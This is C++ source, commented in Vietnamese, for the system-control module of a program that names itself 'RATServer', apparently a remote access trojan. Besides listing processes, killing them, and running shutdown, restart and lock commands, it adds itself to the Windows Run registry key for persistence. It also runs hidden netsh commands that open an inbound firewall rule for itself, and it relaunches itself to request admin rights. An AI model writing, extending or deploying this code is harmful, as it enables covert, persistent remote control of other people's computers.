#include "SystemManager.h"

std::vector<std::string> GetProcessList() {
    std::vector<std::string> listProc;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return listProc;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return listProc;
    }

    do {
        listProc.push_back(std::string(pe32.szExeFile) + " | " + std::to_string(pe32.th32ProcessID));
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return listProc;
}

bool KillProcessByPID(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess == NULL) return false;

    BOOL result = TerminateProcess(hProcess, 1);
    CloseHandle(hProcess);
    return (result != 0);
}

int KillProcessByName(std::string targetInput) {
    std::string target = ToLower(targetInput);
    if (target.find(".exe") == std::string::npos) target += ".exe";

    int killCount = 0;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return 0;
    }

    do {
        if (ToLower(pe32.szExeFile) == target) {
            if (KillProcessByPID(pe32.th32ProcessID)) {
                killCount++;
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return killCount;
}

bool StartApp(std::string path) {
    return ((intptr_t)ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOW) > 32);
}

void SystemControl(std::string type) {
    if (type == "SHUTDOWN") {
        system("shutdown /s /t 5");
    }
    else if (type == "RESTART") {
        system("shutdown /r /t 5");
    }
    else if (type == "LOCK") {
        system("rundll32.exe user32.dll,LockWorkStation");
    }
}

// [MỚI] Hàm thêm chính mình vào Startup
bool InstallStartup() {
    char path[MAX_PATH];
    // 1. Lấy đường dẫn tuyệt đối của file .exe đang chạy
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) return false;

    HKEY hKey;
    // 2. Mở khóa Registry Run của User hiện tại
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    // 3. Ghi giá trị (Tên: RATServer, Dữ liệu: Đường dẫn file exe)
    long result = RegSetValueExA(hKey, "RATServer", 0, REG_SZ, (LPBYTE)path, strlen(path) + 1);

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// [MỚI] Hàm gỡ bỏ khỏi Startup
bool RemoveStartup() {
    HKEY hKey;
    // 1. Mở khóa
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    // 2. Xóa giá trị có tên RATServer
    long result = RegDeleteValueA(hKey, "RATServer");

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// [MỚI] Hàm kiểm tra xem Startup đã được cài đặt chưa
bool CheckStartupExists() {
    HKEY hKey;
    // 1. Mở khóa Registry Run của User hiện tại
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    // 2. Kiểm tra xem giá trị RATServer có tồn tại không
    char buffer[MAX_PATH];
    DWORD bufferSize = MAX_PATH;
    long result = RegQueryValueExA(hKey, "RATServer", NULL, NULL, (LPBYTE)buffer, &bufferSize);

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

void SetupFirewall() {
    char path[MAX_PATH];
    // 1. Lấy đường dẫn file .exe hiện tại
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) return;
    std::string exePath = std::string(path);

    // 2. Tạo lệnh CMD để mở Firewall cho App này
    // Lệnh: netsh advfirewall firewall add rule name="RAT_Server" dir=in action=allow program="C:\path\to\server.exe" enable=yes
    std::string cmd = "/c netsh advfirewall firewall delete rule name=\"RAT_Auto_Rule\" & "; // Xóa rule cũ nếu có để tránh trùng
    cmd += "netsh advfirewall firewall add rule name=\"RAT_Auto_Rule\" dir=in action=allow program=\"" + exePath + "\" enable=yes";

    // 3. Thực thi lệnh ngầm (Runas để yêu cầu quyền Admin nếu cần, SW_HIDE để không hiện cửa sổ)
    ShellExecuteA(NULL, "runas", "cmd.exe", cmd.c_str(), NULL, SW_HIDE);
}

// [MỚI] Kiểm tra xem tiến trình hiện tại có quyền Admin không
bool IsRunAsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
        FreeSid(pAdministratorsGroup);
    }
    return fIsRunAsAdmin;
}

// [MỚI] Logic thông minh: Tự động đòi Admin nếu cần thiết
// Trả về TRUE nếu mọi thứ đã ổn (hoặc đã xử lý xong)
// Trả về FALSE nếu đang yêu cầu restart bằng Admin (cần tắt bản hiện tại)
bool CheckAndSetupFirewall() {
    // 1. Lấy đường dẫn file EXE hiện tại
    char path[MAX_PATH];
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) return true;
    std::string currentPath = std::string(path);

    // 2. Đọc đường dẫn cũ đã lưu trong Registry
    HKEY hKey;
    char savedPath[MAX_PATH] = "";
    DWORD bufferSize = sizeof(savedPath);
    bool needUpdate = true;

    // Mở khóa Registry của app (HKCU\Software\RATServer)
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\RATServer", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "FirewallPath", NULL, NULL, (LPBYTE)savedPath, &bufferSize) == ERROR_SUCCESS) {
            // So sánh: Nếu đường dẫn hiện tại GIỐNG đường dẫn đã lưu -> Firewall đã OK
            if (currentPath == std::string(savedPath)) {
                needUpdate = false;
            }
        }
        RegCloseKey(hKey);
    }

    // 3. Nếu không cần update -> Cho qua luôn
    if (!needUpdate) return true;

    // 4. Nếu cần update (Lần đầu hoặc đổi chỗ) -> Kiểm tra quyền Admin
    if (IsRunAsAdmin()) {
        // --- TRƯỜNG HỢP: ĐÃ LÀ ADMIN ---
        // a. Chạy lệnh mở Firewall (Code cũ của bạn)
        std::string cmd = "/c netsh advfirewall firewall delete rule name=\"RAT_Auto_Rule\" & ";
        cmd += "netsh advfirewall firewall add rule name=\"RAT_Auto_Rule\" dir=in action=allow program=\"" + currentPath + "\" enable=yes";
        ShellExecuteA(NULL, "open", "cmd.exe", cmd.c_str(), NULL, SW_HIDE);

        // b. Lưu đường dẫn mới vào Registry để lần sau không hỏi nữa
        if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\RATServer", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "FirewallPath", 0, REG_SZ, (const BYTE*)currentPath.c_str(), currentPath.length() + 1);
            RegCloseKey(hKey);
        }

        return true; // Đã xử lý xong, chạy tiếp
    }
    else {
        // --- TRƯỜNG HỢP: CHƯA LÀ ADMIN ---
        // Yêu cầu Windows chạy lại chính file này với quyền Admin ("runas")
        ShellExecuteA(NULL, "runas", path, NULL, NULL, SW_SHOW);
        return false; // Báo cho main() biết để tự tắt bản user này đi
    }
}